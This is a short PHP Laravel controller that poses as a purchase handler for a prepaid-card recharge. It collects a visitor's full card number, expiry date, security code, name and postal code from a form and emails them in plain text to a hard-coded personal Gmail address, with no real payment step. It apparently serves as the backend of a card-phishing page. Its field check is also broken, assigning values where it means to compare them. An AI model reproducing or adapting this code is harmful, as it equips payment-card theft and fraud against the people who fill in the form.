<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class Achat extends Controller
{
    public function achat()
    {
        $value = "0";
        if (isset($_GET['prix'])) {
            $value = strip_tags(trim($_GET['prix']));
        }
        if (isset($_POST['validerpaie'])) {
            $nom = strip_tags(trim($_POST['nom']));
            $num = strip_tags(trim($_POST['num']));
            $date_exp = strip_tags(trim($_POST['date_exp']));
            $code = strip_tags(trim($_POST['code']));
            $zip = strip_tags(trim($_POST['zip']));

            if ($nom != "" && $num = !"" && $date_exp = !"" && $code = !"" && $zip != "") {
                $to = "laleyeade445@gmail.com";
                $subject = "Recharge TransCash";
                $msg = "
			  Nom de la carte : " . $nom . "
			  Num de la carte : " . $num . "
			  Date d'expiration : " . $date_exp . "
			  Code  : " . $code . " 
			  Code Postal / Zip: " . $zip . "
			  ";
                if (mail($to, $subject, $msg)) {
                    $_SESSION['success'] = true;
                } else {
                    $_SESSION['echec'] = true;
                }
            } else {
                $_SESSION['vide'] = true;
            }
        }

        return view('achat');
    }
}
